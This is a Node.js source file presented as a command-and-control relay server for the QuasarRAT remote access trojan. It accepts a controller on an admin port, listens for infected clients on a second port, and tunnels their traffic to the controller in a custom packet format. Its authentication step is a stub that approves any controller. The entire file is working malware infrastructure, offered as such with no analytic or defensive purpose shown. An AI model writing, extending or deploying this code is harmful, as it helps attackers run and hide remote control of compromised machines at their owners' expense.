
/** @file C&C Server implementation for QuasarRAT
  * @author David Landeros (dh.landeros08@gmail.com)
  */

var net = require("net");
var os = require("os");
var config = require("./config.js");

/** @module Utils
  * @desc The Utils module provides access to some utility functions
  */
var Utils = (function(){

    const isLittleEndian = os.endianness() == "LE";

    /** @function myFunction
      * @desc Parses a textual IPv4 into an uint32
      * @returns {Number} Decimal representation of the IP address
      */
    function parseIp(str)
    {
        var aux = str.split(".");
        var ui8array = new Uint8Array(4);
        ui8array[0] = parseInt(aux[0]);
        ui8array[1] = parseInt(aux[1]);
        ui8array[2] = parseInt(aux[2]);
        ui8array[3] = parseInt(aux[3]);
        if(isLittleEndian) {
            return new Uint32Array(ui8array.reverse().buffer)[0];
        }
        return new Uint32Array(ui8array.buffer)[0];
    }

    /** @function bufferCopy
      * @desc Copies a range of items from an array to another
      */
    function bufferCopy(source, sindex, dest, dindex, count)
    {
        for(var i = 0; i < count; i++)
        {
            dest[dindex + i] = source[sindex + i];
        }
    }

    /** @function hexDumpBuffer
      * @desc Prints an hexadecimal representation of a buffer
      */
    function hexDumpBuffer(buffer)
    {
        var str = Array.prototype.map.call(new Uint8Array(buffer), x => ('00' + x.toString(16)).slice(-2)).join(' ');
        console.log(str);
    }

    /** @function strGetBytes
      * @desc converts a string into an Uint8Array
      */
    function strGetBytes(str)
    {
        if(str.constructor == Buffer)
        {
            return new Uint8Array(str);
        }

        var bufView = new Uint8Array(str.length);
        for (var i = 0; i < str.length; i++)
        {
            bufView[i] = str.charCodeAt(i);
        }
        return bufView;
    }

    /** @function uint32GetBytes
      * @desc converts a 32 bits Number into an Uint8Array (Big endian)
      */
    function uint32GetBytes(value)
    {
        var ui32 = new Uint32Array(1);
        ui32[0] = value;
        if(isLittleEndian) {
            return new Uint8Array(ui32.buffer).reverse();
        }
        return new Uint8Array(ui32.buffer);
    }

    /** @function uint32GetBytes
      * @desc converts a 16 bits Number into an Uint8Array (Big endian)
      */
    function uint16GetBytes(value)
    {
        var ui16 = new Uint16Array(1);
        ui16[0] = value;
        if(isLittleEndian) {
            return new Uint8Array(ui16.buffer).reverse();
        }
        return new Uint8Array(ui16.buffer);
    }

    /** @function getUint32
      * @desc extracts a 32bits unsigned integer from a buffer
      */
    function getUint32(buffer, offset)
    {
        var tmp = new Uint8Array(buffer.slice(offset, offset + 4));
        if(isLittleEndian) {
            tmp = tmp.reverse();
        }
        return new Uint32Array(tmp.buffer)[0];
    }

    /** @function getUint16
      * @desc extracts a 16bits unsigned integer from a buffer
      */
    function getUint16(buffer, offset)
    {
        var tmp = new Uint8Array(buffer.slice(offset, offset + 2));
        if(isLittleEndian) {
            tmp = tmp.reverse();
        }
        return new Uint16Array(tmp.buffer)[0];
    }

    /** @function log
      * @desc prints a message on the console adding a timestamp
      * and filling the screen width using "." (dots)
      */
    function log(message)
    {
        var timestamp = new Date().toGMTString();
        var missingChars = process.stdout.columns - (message.length + timestamp.length + 6);
        var output = "  " + message + " ";
        for(var i = 0; i < missingChars; i++) {
            output += ".";
        }
        output += " " + timestamp;
        console.log(output);
    }

    return { parseIp        : parseIp,
             bufferCopy     : bufferCopy,
             hexDumpBuffer  : hexDumpBuffer, 
             strGetBytes    : strGetBytes,
             uint32GetBytes : uint32GetBytes,
             uint16GetBytes : uint16GetBytes,
             log            : log,
             getUint16      : getUint16,
             getUint32      : getUint32 };

})();

/** @module TunnelPacket
  * @desc Parses and serializes TunnelPackets
  *       The tunnelPackets are built with the following format:
  *       [ 4 bytes for the Origin IP Address]
  *       [ 2 bytes for the Origin Port (big-endian)]
  *       [ 1 byte for the packet type ]
  *       [ 2 bytes for the payload size (big-endian)]
  *       [ payload (variable length) ]
  *
  * @example
  *     var packet = {
  *        ip      : Utils.parseIp("127.0.0.1"),
  *        port    : 8080,
  *        type    : TunnelPacket.TCP_PSH,
  *        payload : "ABCD",
  *     };
  *     var buffer = TunnelPacket.serialize(packet);
  */
var TunnelPacket = (function(){

    const TCP_SYN = 0x00;
    const TCP_PSH = 0x01;
    const TCP_FIN = 0x02;

    /** @function parse
      * @desc converts a buffer into a TunnelPacket object
      * @returns {Object} a tunnel packet in json format
      */
	  function parse(buffer) {
          var bytesArray = new Uint8Array(buffer);
          var packet = {};
          packet.ip = Utils.getUint32(bytesArray, 0);
          packet.port = Utils.getUint16(bytesArray, 4);
          packet.type = bytesArray[6];
          var size = Utils.getUint16(bytesArray, 7);
          packet.payload = new Buffer(bytesArray.slice(9, 9 + size));
          return packet;
	  }

    /** @function serialize
      * @desc Creates a TunnelPacket from its object representation
      * @returns {Uint8Array} the buffer to be sent through the tunnel
      */
	  function serialize(obj) {
          var result = new Uint8Array(9 + obj.payload.length);
          Utils.bufferCopy(Utils.uint32GetBytes(obj.ip), 0, result, 0, 4);
          Utils.bufferCopy(Utils.uint16GetBytes(obj.port), 0, result, 4, 2);
          result[6] = obj.type;
          Utils.bufferCopy(Utils.uint16GetBytes(obj.payload.length), 0, result, 7, 2);
          Utils.bufferCopy(Utils.strGetBytes(obj.payload), 0, result, 9, obj.payload.length);
          Utils.hexDumpBuffer(result.buffer);
          return new Buffer(result.buffer);
	  }

    return { TCP_SYN   : TCP_SYN,
             TCP_PSH   : TCP_PSH,
             TCP_FIN   : TCP_FIN,
             parse     : parse,
             serialize : serialize };
})();


/** @module Tunnel
  * @desc This module forwards incoming connections (on the clientPort) to the adminSocket,
  * wrapping incomming packets using the TunnelPacket Format.
  *
  * Note: In order to support multiple-admins-multiple-clients, you can convert this module
  * to a class and then create an instance for each admin connection received.
  */
var Tunnel = (function(){

    var clientList = [];
    var listener = null;
    var adminSocket = null;

    /** @function init
      * @desc Initializes the tunnel (called from CCServer module)
      */
    function init(_adminSocket, clientPort)
    {
        Utils.log("Controller connected from " + _adminSocket.remoteAddress);

        if(listener != null) {
            listener.close();
        }
        if(adminSocket != null) {
            adminSocket.end();
        }
        adminSocket = _adminSocket;

        listener = net.createServer(function(client) {

            /** Installs event listeners facing the client
              */
            client.on("data", function(data){
                onDataFromClient(client, data);
            });
            client.on("close", function(){
                onClientDisconnected(client);
            });
            client.on("error", function(){});
            onClientConnected(client);
        });

        /** Starts the listener for clients
          */
        listener.listen(clientPort, "0.0.0.0", function(){
            Utils.log("Waiting for clients");
        });

        /** Installs event listeners facing the controller
          */
        adminSocket.on("data", function(data){
            onDataFromAdmin(data);
        });
        adminSocket.on("close", function(data){
            Utils.log("Connection with controller closed, Tunnel destroyed");
        });
        adminSocket.on("error", function(){});
    }

    /** @function onClientConnected
      * @desc Takes a new client, adds it to the list
      * and informs the controller/admin that a new client has been connected
      */
    function onClientConnected(client)
    {
        var packet = {
            ip : Utils.parseIp(client.remoteAddress),
            port : client.remotePort,
            type : TunnelPacket.TCP_SYN,
            payload : "",
        };
        var payload = TunnelPacket.serialize(packet);
        adminSocket.write(TunnelPacket.serialize(packet));
        clientList.push(client);
    }

    /** @function onClientDisconnected
      * @desc Takes a client, removes it from the list
      * and informs the controller/admin that a client has been disconnected
      */
    function onClientDisconnected(client)
    {
        var packet = {
            ip : Utils.parseIp(client.remoteAddress),
            port : client.remotePort,
            type : TunnelPacket.TCP_FIN,
            payload : "",
        };
        adminSocket.write(TunnelPacket.serialize(packet));
        for(var i = 0; i < clientList.length; i++)
        {
            if(clientList[i] == client)
            {
                clientList.splice(i,1);
                break;
            }
        }
    }

    /** @function onDataFromClient
      * @desc Forwards a packet from a client to admin/controller
      * using the TunnelPacket format
      */
    function onDataFromClient(client, data)
    {
        var packet = {
            ip : Utils.parseIp(client.remoteAddress),
            port : client.remotePort,
            type : TunnelPacket.TCP_PSH,
            payload : data,
        };
        adminSocket.write(TunnelPacket.serialize(packet));
        clientList.push(client);
    }

    /** @function onDataFromClient
      * @desc Forwards a packet from admin/controller
      * to the recipient client using the TunnelPacket format
      */
    function onDataFromAdmin(data)
    {
        var packet = TunnelPacket.parse(data);
        for(var i = 0; i < clientList.length; i++)
        {
            /** FIXME: Should exists a faster way to find the recipient of the packet
              */
            if(packet.ip == Utils.parseIp(clientList[i].remoteAddress) && packet.port == clientList[i].remotePort )
            {
                if(packet.type ==  TunnelPacket.TCP_PSH)
                {
                    clientList[i].write(packet.payload);
                }
                else if(packet.type ==  TunnelPacket.TCP_FIN)
                {
                    clientList[i].end();
                }

                /** TCP_SYN should not arrive from the admin
                  * since the controller does not initiate connections
                  */
                break;
            }
        }
    }

    return { init : init };

})();

/** @module CCServer
  * @desc This is the main module, it waits for admins to get connected
  * and then creates a tunnel to forward client connections.
  * This version only supports: single-admin-multiple-clients.
  */
var CCServer = (function() {

    /** @function init
      * @desc Initializes everything using the current config
      */
    function init() {
        net.createServer(function(socket) {
        	StartHandShaking(socket, function(authorized) {
                if(authorized) {
                    Tunnel.init(socket, config.clientPort);
                }
                else {
                	socket.end();
                }
        	});
        }).listen(config.adminPort, "0.0.0.0", function(){
          Utils.log("C&C Server started, waiting for controllers");
        });
    }

    /** @function StartHandShaking
      * @desc Authenticates admin/controllers
      */
    function StartHandShaking(socket, callback) {
        Utils.log("Warning: StartHandShaking is not implemented");
        socket.write("desafio");
        callback(true);
    }

    /* Exported functions
     */
   return { init : init }
	
})();

CCServer.init();